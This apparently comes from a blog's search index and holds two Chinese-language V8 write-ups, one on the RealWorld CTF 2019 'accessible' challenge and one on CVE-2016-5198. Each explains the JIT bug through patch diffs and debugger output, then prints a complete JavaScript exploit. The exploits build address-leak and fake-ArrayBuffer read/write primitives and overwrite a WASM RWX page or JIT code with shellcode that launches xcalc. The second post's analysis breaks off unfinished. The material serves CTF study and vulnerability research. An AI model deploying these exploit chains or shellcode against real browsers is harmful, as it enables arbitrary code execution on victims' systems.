<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[RealWorld ctf 2019 accessible writeup]]></title>
    <url>%2Fpost%2F9850d6ab.html</url>
    <content type="text"><![CDATA[​ 这道题中，主要涉及v8中的dependency机制，由于patch文件删除了某些添加依赖（dependency）的代码，导致在生成的JIT代码中，即使某些元素类型发生了变化也不会触发deoptimize，从而导致type confusion。​ 在这篇writeup里我主要记录我分析的过程，因为我事先从已有的wp中知道到了一些结论性的东西，所以我试图找到一个从零逐步寻找得到最后结果的逻辑，这个过程中可能会显得比较啰嗦。​调试环境具体环境搭建步骤就不详述了，patch文件在这里下载12345git reset --hard eefa087eca9c54bdb923b8f5e5e14265f6970b22gclient syncgit apply ../challenge.patch./tools/dev/v8gen.py x64.debugninja -C ./out.gn/x64.debug漏洞分析首先分析题目patch文件1234567891011121314151617181920212223242526272829303132333435diff --git a/src/compiler/access-info.cc b/src/compiler/access-info.ccindex 0744138..1df06df 100644--- a/src/compiler/access-info.cc+++ b/src/compiler/access-info.cc@@ -370,9 +370,11 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo( // The field type was cleared by the GC, so we don't know anything // about the contents now. &#125;+#if 0 unrecorded_dependencies.push_back( dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(map_ref, descriptor));+#endif if (descriptors_field_type-&gt;IsClass()) &#123; // Remember the field map, and try to infer a useful type. Handle&lt;Map&gt; map(descriptors_field_type-&gt;AsClass(), isolate());@@ -384,15 +386,17 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo( &#125; // TODO(turbofan): We may want to do this only depending on the use // of the access info.+#if 0 unrecorded_dependencies.push_back( dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor));+#endif PropertyConstness constness; if (details.IsReadOnly() &amp;&amp; !details.IsConfigurable()) &#123; constness = PropertyConstness::kConst; &#125; else &#123; map_ref.SerializeOwnDescriptor(descriptor);- constness = dependencies()-&gt;DependOnFieldConstness(map_ref, descriptor);+ constness = PropertyConstness::kConst; &#125; Handle&lt;Map&gt; field_owner_map(map-&gt;FindFieldOwner(isolate(), descriptor), isolate());AccessInfoFactory::ComputeDataFieldAccessInfo函数中，有两处unrecorded_dependencies.push_back被删除掉，同时让constness始终被赋值为PropertyConstness::kConst先浏览一下整个函数的功能（以下为patch后的代码），首先获取了map中的instance_descriptors(存储了对象属性的元信息)，然后通过descriptor定位到了一个具体的属性。123456789PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo( Handle&lt;Map&gt; receiver_map, Handle&lt;Map&gt; map, MaybeHandle&lt;JSObject&gt; holder, int descriptor, AccessMode access_mode) const &#123; ... Handle&lt;DescriptorArray&gt; descriptors(map-&gt;instance_descriptors(), isolate()); PropertyDetails const details = descriptors-&gt;GetDetails(descriptor); ... Representation details_representation = details.representation(); ...依次判断属性的类型，在进行一定的检查后，将属性加入到unrecorded_dependencies中。patch导致了一些本应该加入到unrecorded_dependencies的属性没有被加入进去。1234567891011121314151617181920212223242526272829 if (details_representation.IsNone()) &#123; ... &#125; ZoneVector&lt;CompilationDependency const*&gt; unrecorded_dependencies(zone()); if (details_representation.IsSmi()) &#123; ... unrecorded_dependencies.push_back( dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(map_ref, descriptor)); &#125; else if (details_representation.IsDouble()) &#123; ... unrecorded_dependencies.push_back( dependencies()-&gt;FieldRepresentationDependencyOffTheRecord( map_ref, descriptor)); &#125; else if (details_representation.IsHeapObject()) &#123; ...#if 0 unrecorded_dependencies.push_back( dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(map_ref, descriptor));#endif &#125; else &#123; ... &#125; #if 0 unrecorded_dependencies.push_back( dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor));#endif ...最后，因为patch的修改，使得所有属性都被标注为KConst123456789101112131415161718192021PropertyConstness constness;if (details.IsReadOnly() &amp;&amp; !details.IsConfigurable()) &#123; constness = PropertyConstness::kConst;&#125; else &#123; map_ref.SerializeOwnDescriptor(descriptor); constness = PropertyConstness::kConst;&#125;Handle&lt;Map&gt; field_owner_map(map-&gt;FindFieldOwner(isolate(), descriptor), isolate());switch (constness) &#123; case PropertyConstness::kMutable: return PropertyAccessInfo::DataField( zone(), receiver_map, std::move(unrecorded_dependencies), field_index, details_representation, field_type, field_owner_map, field_map, holder); case PropertyConstness::kConst: return PropertyAccessInfo::DataConstant( zone(), receiver_map, std::move(unrecorded_dependencies), field_index, details_representation, field_type, field_owner_map, field_map, holder);&#125;在这里，这个unrecorded_dependencies显然是问题的关键。继续跟踪函数返回值可以发现最终返回的是一个PropertyAccessInfo对象，而unrecorded_dependencies则是被初始化赋值给私有成员unrecorded_dependencies_12345678910111213141516171819PropertyAccessInfo::PropertyAccessInfo( Kind kind, MaybeHandle&lt;JSObject&gt; holder, MaybeHandle&lt;Map&gt; transition_map, FieldIndex field_index, Representation field_representation, Type field_type, Handle&lt;Map&gt; field_owner_map, MaybeHandle&lt;Map&gt; field_map, ZoneVector&lt;Handle&lt;Map&gt;&gt;&amp;&amp; receiver_maps, ZoneVector&lt;CompilationDependency const*&gt;&amp;&amp; unrecorded_dependencies) : kind_(kind), receiver_maps_(receiver_maps), unrecorded_dependencies_(std::move(unrecorded_dependencies)), transition_map_(transition_map), holder_(holder), field_index_(field_index), field_representation_(field_representation), field_type_(field_type), field_owner_map_(field_owner_map), field_map_(field_map) &#123; DCHECK_IMPLIES(!transition_map.is_null(), field_owner_map.address() == transition_map.address());&#125;查找引用该私有成员的代码，主要有两个函数1234bool PropertyAccessInfo::Merge(PropertyAccessInfo const* that, AccessMode access_mode, Zone* zone)void PropertyAccessInfo::RecordDependencies( CompilationDependencies* dependencies)其中Merge函数中合并了两个unrecorded_dependencies_，RecordDependencies函数中将unrecorded_dependencies_转移到了CompilationDependencies类的私有成员dependencies_并清空了自身浏览CompilationDependencies类所在的compilation-dependency.cc(.h)文件，从注释中可以得知该类用于收集和安装正在生成的代码的依赖。在文件中查找dependencies_，发现主要引用的代码均为遍历dependencies_并调用IsValid()。IsValid()被CompilationDependencies的每个子类所重载，根据代码，其功能我的理解是用于判断某个元素是否已经改变或者过时。为了进一步了解该类的作用，我在搜索了引用该头文件的代码。可以发现，结果中几乎都是用于JIT优化的文件。逐个跟进文件查看后，我在compilation-dependencies.cc中注意到了以下部分代码。从代码中可以看出，Ruduce过程中，可以通过添加dependency的方式来将CheckMaps节点删除，我认为这便是道题的root cause.1234567891011121314151617181920212223242526Reduction TypedOptimization::ReduceCheckMaps(Node* node) &#123; // The CheckMaps(o, ...map...) can be eliminated if map is stable, // o has type Constant(object) and map == object-&gt;map, and either // (1) map cannot transition further, or // (2) we can add a code dependency on the stability of map // (to guard the Constant type information). Node* const object = NodeProperties::GetValueInput(node, 0); Type const object_type = NodeProperties::GetType(object); Node* const effect = NodeProperties::GetEffectInput(node); base::Optional&lt;MapRef&gt; object_map = GetStableMapFromObjectType(broker(), object_type); if (object_map.has_value()) &#123; for (int i = 1; i &lt; node-&gt;op()-&gt;ValueInputCount(); ++i) &#123; Node* const map = NodeProperties::GetValueInput(node, i); Type const map_type = NodeProperties::GetType(map); if (map_type.IsHeapConstant() &amp;&amp; map_type.AsHeapConstant()-&gt;Ref().equals(*object_map)) &#123; if (object_map-&gt;CanTransition()) &#123; dependencies()-&gt;DependOnStableMap(*object_map); &#125; return Replace(effect); &#125; &#125; &#125; return NoChange();&#125;12// Record the assumption that &#123;map&#125; stays stable.void DependOnStableMap(const MapRef&amp; map);总结结合一些资料，对dependency我的理解是对于JS类型的不稳定性，v8中有两种方式被用来保证runtime优化代码中对类型假设的安全性通过添加CheckMaps节点来对类型进行检查，当类型不符合预期时将会bail out以dependency的方式。将可能影响map假设的元素添加到dependencies中，通过检查这些dependency的改变来触发回调函数进行deoptimize该题目中，因为删除了某些添加dependency的代码，这就导致在代码runtime中，某些元素的改变不会被检测到从而没有deoptimize，最终造成type confusion。构造POCpatch删除了details_representation.IsHeapObject()分支中的unrecorded_dependencies.push_back操作，这意味HeapObject类型不会被加入dependencies中。运行以下代码1234567891011121314var obj = &#123;&#125;;obj.c = &#123;a: 1.1&#125;;function leaker(o)&#123; return o.c.a;&#125;for (var i = 0; i &lt; 0x4000; i++) &#123; leaker(obj);&#125;var buf_to_leak = new ArrayBuffer();obj.c = &#123;b: buf_to_leak&#125;console.log(leaker(obj)) //output: 2.0289592652999e-310以上代码中，将字典{a: 1.1}加入到obj中，函数leaker返回o.c.a将obj作为参数传入leaker，生成JIT代码后，用{b: buf_to_leak}替换掉原来的字典，再次调用leaker(obj)，可以发现并没有触发deoptimize，而是输出了一个double值（buf_to_leak的地址)其原因正是因为{a: 1.1}对象并没有被添加到dependency中，导致后期修改时并没有被检测到，从而导致问题。注意：修改obj.c时不能使用同属性名，如{a: buf_to_leak}，因为事实上仍然存在一些依赖会影响到deoptimize，这点我没有找到更详细的解释，希望有师傅能够解释一下。参考：https://twitter.com/itszn13/status/1173627505485516801?s=20使用Turbolizer可视化程序IR，验证我们的猜想1234cd tools/turbolizernpm inpm run-script buildpython -m SimpleHTTPServer使用以下命令执行代码，并使用浏览器访问127.0.0.1:8000打开生成的文件1./out.gn/x64.debug/d8 --trace-turbo ../../../exps/accessible/poc.js --trace-turbo-path ../可以看到，在TyperLowering时还存在两次CheckMaps，分别对应obj和obj.c而到了SimplifiedLowering时已经只有对obj的CheckMaps了，这说明obj.c的转为使用dependency的方式来进行检查。漏洞利用既然存在type confusion，那么我们可以用JSArray来伪造一个ArrayBuffer，即可控制到BackingStore，从而实现任意读写。对象地址泄露在poc中我们已经实现了该功能123456789101112var obj1 = &#123;c: &#123;x: 1.1&#125;&#125;;function leaker(o)&#123; return o.c.x;&#125;for(var i = 0; i &lt; 0x5000; i++)&#123; leaker(obj1);&#125;function leak_obj(o)&#123; obj1.c = &#123;y: o&#125;; res = mem.d2u(leaker(obj1)) return res&#125;伪造ArrayBufferJSArray内存模型我们首先进行如下调试123456789101112131415161718192021222324252627282930313233343536373839404142434445464748d8&gt; var arr = [1.1, 2.2, 3.3]d8&gt; %DebugPrint(arr)DebugPrint: 0x831db04dd99: [JSArray] - map: 0x2b36a3c82ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties] - prototype: 0x251f23191111 &lt;JSArray[0]&gt; - elements: 0x0831db04dd71 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS] - length: 3 - properties: 0x25361adc0c71 &lt;FixedArray[0]&gt; &#123; #length: 0x3860ab3401a9 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - elements: 0x0831db04dd71 &lt;FixedDoubleArray[3]&gt; &#123; 0: 1.1 1: 2.2 2: 3.3 &#125;0x2b36a3c82ed9: [Map] - type: JS_ARRAY_TYPE - instance size: 32 - inobject properties: 0 - elements kind: PACKED_DOUBLE_ELEMENTS - unused property fields: 0 - enum length: invalid - back pointer: 0x2b36a3c82e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; - prototype_validity cell: 0x3860ab340609 &lt;Cell value= 1&gt; - instance descriptors #1: 0x251f23191f49 &lt;DescriptorArray[1]&gt; - layout descriptor: (nil) - transitions #1: 0x251f23191eb9 &lt;TransitionArray[4]&gt;Transition array #1: 0x25361adc4ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x2b36a3c82f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt; - prototype: 0x251f23191111 &lt;JSArray[0]&gt; - constructor: 0x251f23190ec1 &lt;JSFunction Array (sfi = 0x3860ab34aca1)&gt; - dependent code: 0x25361adc02c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0pwndbg&gt; x/12gx 0x831db04dd99-1 // JSArray0x831db04dd98: 0x00002b36a3c82ed9 0x000025361adc0c71 // Map Properties0x831db04dda8: 0x00000831db04dd71 0x0000000300000000 // Elements Length0x831db04ddb8: 0x000025361adc0941 0x00000adc7d4370820x831db04ddc8: 0x6974636e7566280a 0x220a7b2029286e6f0x831db04ddd8: 0x6972747320657375 0x2f2f0a0a3b2274630x831db04dde8: 0x2065726f6d204120 0x6173726576696e75pwndbg&gt; x/12gx 0x831db04dd71-1 // Elements0x831db04dd70: 0x000025361adc14f9 0x0000000300000000 // Map Length0x831db04dd80: 0x3ff199999999999a 0x400199999999999a // 1.1 2.20x831db04dd90: 0x400a666666666666 0x00002b36a3c82ed9 // 3.30x831db04dda0: 0x000025361adc0c71 0x00000831db04dd710x831db04ddb0: 0x0000000300000000 0x000025361adc09410x831db04ddc0: 0x00000adc7d437082 0x6974636e7566280a从地址很容易可以看出，在Elements的后面紧跟的就是JSArray对象的Map，布局如下图1234567891011121314151617181920212223Elements---&gt;+-------------+ | MAP +&lt;------+ +-------------+ | | Length | | +-------------+ | | element#1 | | +-------------+ | | element#2 | | +-------------+ | | ... | | +-------------+ | | element#N | | JSArray---&gt;--------------+ | | MAP | | +-------------+ | | Properties | | +-------------+ | | Elements +-------+ +-------------+ | Length | +-------------+ | ... | +-------------+这意味着我们可以通过JSArray对象的地址来计算得到其Elements的地址，这为我们之后伪造ArrayBuffer后寻找其地址提供了便利。trick：在调试过程中会发现，Elements并不是始终紧邻JSArray的，有些时候两者会相距一段距离。在师傅们的wp中提到可以使用splice来使该布局稳定，例如1var arr = [1.1, 2.2, 3.3].splice(0);具体原理我没有找到相关资料。。可能只有等以后读了源码才知道吧（有师傅知道的话可以说说吗ArrayBuffer内存模型在伪造ArrayBuffer的时候需要同时也伪造出它的Map的结构（当然，也可以对内存中ArrayBuffer的Map地址进行泄露，但是就麻烦了），通过找到JSArray的地址，+0x40即为map的地址，再将map地址填入JSArray的第一项即可。这部分可以通过调试一个真正的ArrayBuffer并将其Map复制下来（这里并不需要全部的数据）。关于Map的内存模型可以参考这里。123456789101112131415var fake_ab = [ //map|properties mem.u2d(0x0), mem.u2d(0x0), //elements|length mem.u2d(0x0), mem.u2d(0x1000), //backingstore|0x2 mem.u2d(0x0), mem.u2d(0x2), //padding mem.u2d(0x0), mem.u2d(0x0), //fake map mem.u2d(0x0), mem.u2d(0x1900042317080808), mem.u2d(0x00000000084003ff), mem.u2d(0x0), mem.u2d(0x0), mem.u2d(0x0), mem.u2d(0x0), mem.u2d(0x0),].splice(0);获取伪造的ArrayBuffer和poc的代码类似，不过反了过来，先将填入一个ArrayBuffer进行优化，然后在ArrayBuffer处写入地址，则该地址将作为ArrayBuffer被解析12345678910var ab = new ArrayBuffer(0x1000);var obj2 = &#123;d: &#123;w: ab&#125;&#125;;function faker(o)&#123; return o.d.w;&#125;for(var i = 0; i &lt; 0x5000; i++)&#123; faker(obj2);&#125;obj2.d = &#123;z: mem.u2d(fake_ab_addr)&#125;; //将泄露的JSArray的Elements地址填入real_ab = faker(obj2); //再读取出来WASM在v8利用中总是需要布置shellcode，那么在内存中找到一块具有RWX权限的区域将会十分有帮助。wasm(WebAssembly)详细概念就不在这介绍了，这里值得注意的是是用wasm可以在内存中开辟出一块RWX的内存空间。这里可以将C语言编写的代码转换为wasm格式。当然，编写的c语言代码不能够调用库函数（不然就可以直接写rce了），但是只要通过漏洞，将我们的shellcode覆盖到内存中wasm代码所在rwx区域即可。下文将展示如何定位到rwx内存区域12345678910111213141516171819202122232425262728293031323334353637383940//test.jsconst wasm_code = new Uint8Array([ 0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x00, 0x0b ]); const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));const wasm_func = wasm_instance.exports.a;%DebugPrint(wasm_instance);readline();----------------------------------------------------------------------------------pwndbg&gt; r --allow-natives-syntax ../../exps/OOB/test.jsDebugPrint: 0x3a58a3a21241: [WasmInstanceObject] in OldSpace - map: 0x0764807492b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x00aad2e48559 &lt;Object map = 0x7648074aa29&gt; - elements: 0x3b8a08680c01 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - module_object: 0x00aad2e4d5b9 &lt;Module map = 0x76480748d19&gt;...pwndbg&gt; x/32gx 0x3a58a3a21241-10x3a58a3a21240: 0x00000764807492b9 0x00003b8a08680c010x3a58a3a21250: 0x00003b8a08680c01 0x00000000000000000x3a58a3a21260: 0x0000000000000000 0x00000000000000000x3a58a3a21270: 0x000055f7cd11b8f0 0x00003b8a08680c010x3a58a3a21280: 0x000055f7cd1cd100 0x00003b8a086804b10x3a58a3a21290: 0x0000000000000000 0x00000000000000000x3a58a3a212a0: 0x0000000000000000 0x00000000000000000x3a58a3a212b0: 0x000055f7cd1cd180 0x000055f7cd11b9100x3a58a3a212c0: 0x00000f8fe12f0000 &lt;--RWX area...pwndbg&gt; vmmap 0x00000f8fe12f0000LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0xf8fe12f0000 0xf8fe12f1000 rwxp 1000 0即instance+0x80处即存放了RWX区域的地址1234wasm_inst_addr = leak_obj(wasm_instance) - 1;rwx_area_loc = wasm_inst_addr + 0x80; //获取存放RWX指针的地址//然后将rwx_area_loc填入ArrayBuffer的BackingStore即可泄露出RWX区域地址完整利用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105function success(str, val)&#123; console.log("[+]" + str + "0x" + val.toString(16));&#125;class Memory&#123; constructor()&#123; this.buf = new ArrayBuffer(8); this.f64 = new Float64Array(this.buf); this.u32 = new Uint32Array(this.buf); this.bytes = new Uint8Array(this.buf); &#125; d2u(val)&#123; this.f64[0] = val; let tmp = Array.from(this.u32); return tmp[1] * 0x100000000 + tmp[0]; &#125; u2d(val)&#123; let tmp = []; tmp[0] = parseInt(val % 0x100000000); tmp[1] = parseInt((val - tmp[0]) / 0x100000000); this.u32.set(tmp); return this.f64[0]; &#125; &#125;var mem = new Memory();var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];const wasm_code = new Uint8Array([ 0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x00, 0x0b ]);const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));const wasm_func = wasm_instance.exports.a;var fake_ab = [ //map|properties mem.u2d(0x0), mem.u2d(0x0), //elements|length mem.u2d(0x0), mem.u2d(0x1000), //backingstore|0x2 mem.u2d(0x0), mem.u2d(0x2), //padding mem.u2d(0x0), mem.u2d(0x0), //fake map mem.u2d(0x0), mem.u2d(0x1900042317080808), mem.u2d(0x00000000084003ff), mem.u2d(0x0), mem.u2d(0x0), mem.u2d(0x0), mem.u2d(0x0), mem.u2d(0x0),];var ab = new ArrayBuffer(0x1000);var obj1 = &#123;c: &#123;x: 1.1&#125;&#125;;var obj2 = &#123;d: &#123;w: ab&#125;&#125;;function leaker(o)&#123; return o.c.x;&#125;function faker(o)&#123; return o.d.w;&#125;for(var i = 0; i &lt; 0x5000; i++)&#123; leaker(obj1);&#125;for(var i = 0; i &lt; 0x5000; i++)&#123; faker(obj2);&#125;function leak_obj(o)&#123; obj1.c = &#123;y: o&#125;; res = mem.d2u(leaker(obj1)) return res&#125;fake_ab_addr = leak_obj(fake_ab) - 0x80;wasm_inst_addr = leak_obj(wasm_instance) - 1;success("fake_ab_addr: ", fake_ab_addr);success("wasm_inst_addr: ", wasm_inst_addr);fake_map_addr = fake_ab_addr + 0x40;fake_mapmap_addr = fake_ab_addr + 0x80rwx_area_loc = wasm_inst_addr + 0x80;fake_ab[0] = mem.u2d(fake_map_addr);fake_ab[4] = mem.u2d(rwx_area_loc);obj2.d = &#123;z: mem.u2d(fake_ab_addr)&#125;;real_ab = faker(obj2);view = new DataView(real_ab);rwx_area_addr = mem.d2u(view.getFloat64(0, true));success("rwx_area_addr: ", rwx_area_addr);fake_ab[4] = mem.u2d(rwx_area_addr);for (i = 0; i &lt; shellcode.length; i++)&#123; view.setUint32(i * 4, shellcode[i], true);&#125;wasm_func();参考资料https://mem2019.github.io/jekyll/update/2019/09/16/Real-World-2019-Accessible.html]]></content>
      <categories>
        <category>browser</category>
      </categories>
      <tags>
        <tag>v8</tag>
        <tag>JIT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cve-2016-5198 漏洞分析]]></title>
    <url>%2Fpost%2F32483719.html</url>
    <content type="text"><![CDATA[这是一个由于JIT代码中没有检查全局对象的类型变化而造成的漏洞，可以导致越界读写调试环境漏洞相关链接：https://bugs.chromium.org/p/chromium/issues/detail?id=659475https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e61234git reset --hard a7a350012c05f644f3f373fb48d7ac72f7f60542 gclient sync./tools/dev/v8gen.py x64.debugninja -c ./out.gn/x64.debug漏洞分析POC分析1234567891011121314151617181920function Ctor() &#123; n = new Set();&#125;function Check() &#123; n.xyz = 0x826852f4;&#125;for(var i=0; i&lt;10000; ++i) &#123; Ctor();&#125;for(var i=0; i&lt;10000; ++i) &#123; Check();&#125;//%DebugPrint(Ctor);//%DebugPrint(Check);//readline()Ctor();Check();parseInt('AAAAAAAA') // trigger crash首先poc声明了两个函数，Ctor()创建一个Set()并赋给全局变量n；Check()给全局变量n添加一个属性xyz，并赋值为0x826852f4然后通过两个for循环，将Ctor()和Check()进行了JIT优化接着又重新调用了Ctor()和Check()，最后触发crash简单的从POC上来看，不容易看出来问题的根源在哪，结合patch可以猜测到问题应该是出在JIT优化上。分析两个函数的JIT代码12345678910111213141516171819202122232425262728293031323334353637383940DebugPrint: 0x1b9fa8cab829: [Function] ... - code = 0x1efe03d868e1 &lt;Code: OPTIMIZED_FUNCTION&gt; ...DebugPrint: 0x1b9fa8cab8a9: [Function] ... - code = 0x1efe03d86c21 &lt;Code: OPTIMIZED_FUNCTION&gt; ...pwndbg&gt; job 0x1efe03d86c21 ; Check()0x1efe03d86c21: [Code]kind = OPTIMIZED_FUNCTIONstack_slots = 5compiler = crankshaftInstructions (size = 115)0x1efe03d86c80 0 55 push rbp0x1efe03d86c81 1 4889e5 REX.W movq rbp,rsp0x1efe03d86c84 4 56 push rsi0x1efe03d86c85 5 57 push rdi0x1efe03d86c86 6 4883ec08 REX.W subq rsp,0x80x1efe03d86c8a 10 488b45f8 REX.W movq rax,[rbp-0x8]0x1efe03d86c8e 14 488945e8 REX.W movq [rbp-0x18],rax0x1efe03d86c92 18 488bf0 REX.W movq rsi,rax0x1efe03d86c95 21 493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]0x1efe03d86c9c 28 7305 jnc 35 (0x1efe03d86ca3)0x1efe03d86c9e 30 e83dbcf5ff call StackCheck (0x1efe03ce28e0) ;; code: BUILTIN0x1efe03d86ca3 35 48b889becaa89f1b0000 REX.W movq rax,0x1b9fa8cabe89 ;; object: 0x1b9fa8cabe89 PropertyCell for 0x18a9a3b8a079 &lt;a Set with map 0x355292e0c391&gt;0x1efe03d86cad 45 488b400f REX.W movq rax,[rax+0xf] ;; 从PropertyCell中取出jSSet0x1efe03d86cb1 49 49ba0000805e0a4de041 REX.W movq r10,0x41e04d0a5e800000 ;; 这是要赋的值0x1efe03d86cbb 59 c4c1f96ec2 vmovq xmm0,r100x1efe03d86cc0 64 488b4007 REX.W movq rax,[rax+0x7] ;; 取出JSSet的elements0x1efe03d86cc4 68 488b400f REX.W movq rax,[rax+0xf] ;; 从element中获取xyz属性的地址（这是一个指针）0x1efe03d86cc8 72 c5fb114007 vmovsd [rax+0x7],xmm0 ;; 将值写入xyz属性对应的地址处0x1efe03d86ccd 77 48b81123f04e180e0000 REX.W movq rax,0xe184ef02311 ;; object: 0xe184ef02311 &lt;undefined&gt;0x1efe03d86cd7 87 488be5 REX.W movq rsp,rbp0x1efe03d86cda 90 5d pop rbp0x1efe03d86cdb 91 c20800 ret 0x80x1efe03d86cde 94 6690 nop...可以看到，在Check()函数的JIT代码会从JSSet的elements里根据一定的偏移，将我们的值写入进去，那么在0x1efe03d86ca3处下断点，看看接下来的单独调用会有什么动作。12345678910111213141516171819202122pwndbg&gt; job 0x1b9fa8cabe890x1b9fa8cabe89: [PropertyCell] - value: 0x18a9a3b8a251 &lt;a Set with map 0x355292e06509&gt; - details: (data, dictionary_index: 138, attrs: [WEC]) - cell_type: ConstantType (StableMap)pwndbg&gt; x/6gx 0x18a9a3b8a251-1 ; JSSet0x18a9a3b8a250: 0x0000355292e06509 0x00000e184ef02241 ; MAP | elements 0x18a9a3b8a260: 0x00000e184ef02241 0x000018a9a3b8a2710x18a9a3b8a270: 0x00001b77cb482f11 0x0000000d00000000pwndbg&gt; x/6gx 0xe184ef02241-10xe184ef02240: 0x00001b77cb482309 0x00000000000000000xe184ef02250: 0x00001b77cb482361 0x00000000803b15060xe184ef02260: 0x0000000400000000 0xdeadbeed6c6c756epwndbg&gt; x/6gx 0xe184ef02241-10xe184ef02240: 0x00001b77cb482309 0x00000000000000000xe184ef02250: 0x00001b77cb482361 0x00000000803b15060xe184ef02260: 0x0000000400000000 0xdeadbeed6c6c756epwndbg&gt; b *0x1efe03d86ca3Breakpoint 1 at 0x1efe03d86ca3pwndbg&gt; c... ; 断下后单步执行，观察数据流向// 有空再写 先上EXP（咕咕咕完整利用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115class Memory&#123; constructor()&#123; this.buf = new ArrayBuffer(8); this.f64 = new Float64Array(this.buf); this.u32 = new Uint32Array(this.buf); this.bytes = new Uint8Array(this.buf); &#125; d2u(val)&#123; this.f64[0] = val; let tmp = Array.from(this.u32); return tmp[1] * 0x100000000 + tmp[0]; &#125; u2d(val)&#123; let tmp = []; tmp[0] = parseInt(val % 0x100000000); tmp[1] = parseInt((val - tmp[0]) / 0x100000000); this.u32.set(tmp); return this.f64[0]; &#125; &#125;var mem = new Memory();function leak_string(str)&#123; return str.charCodeAt(0)*0x1+str.charCodeAt(1)*0x100+str.charCodeAt(2)*0x10000+str.charCodeAt(3)*0x1000000+str.charCodeAt(4)*0x100000000+str.charCodeAt(5)*0x10000000000+str.charCodeAt(6)*0x1000000000000+str.charCodeAt(7)*0x100000000000000;&#125;function Ctor1()&#123; n = new Set();&#125;function Ctor2()&#123; m = new Map();&#125;function Ctor3()&#123; l = new ArrayBuffer();&#125;function Check1(obj)&#123; n.xyz0 = 3.4766863919152113e-308; // mem.u2d(0x0019000400007300); n.xyz1 = 0; // mem.u2d(0x1111111) n.xyz2 = 0x1000; n.xyz3 = obj;&#125;function Check2(val)&#123; m.xyz0 = 3.4766863919152113e-308; // mem.u2d(0x0019000400007300); m.xyz1 = 0; // mem.u2d(0x1111111) m.xyz2 = 0x1000; m.xyz3 = val;&#125;function Check3(val)&#123; l.xyz0 = 3.4766863919152113e-308; // mem.u2d(0x0019000400007300); l.xyz1 = val;&#125;function func()&#123; return 0;&#125;for(var i = 0; i &lt; 10000; i++)&#123; func();&#125;for(var i = 0; i &lt; 10000; i++)&#123; Ctor1(); Ctor2(); Ctor3();&#125;for(var i = 0; i &lt; 10000; i++)&#123; Check1(null); Check2(3.4766863919152113e-308); Check3(3.4766863919152113e-308);&#125;//%DebugPrint(Check1);var ab = new ArrayBuffer(0x100);var str= new String(null);//var n, m, l;Ctor1();Ctor2();Ctor3();Check1(ab);ab_addr = leak_string(str);ab_backing = ab_addr + 0x20;print("[*]backing store: 0x" + ab_backing.toString(16));//%DebugPrint(func);Check1(func);func_addr = leak_string(str)-1;code_entry = func_addr + 0x38;print("[*]func address: 0x" + func_addr.toString(16));//%DebugPrint(str);Check1(String(null));Check2(mem.u2d(ab_backing - 0x8));Check3(mem.u2d(code_entry));dataView = new DataView(ab);rwx_area = mem.d2u(dataView.getFloat64(0, true));print("[*]rwx_area: 0x" + rwx_area.toString(16));Check3(mem.u2d(rwx_area));var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];for (i = 0; i &lt; shellcode.length; i++)&#123; dataView.setUint32(i * 4, shellcode[i], true);&#125;func();]]></content>
      <categories>
        <category>browser</category>
      </categories>
      <tags>
        <tag>v8</tag>
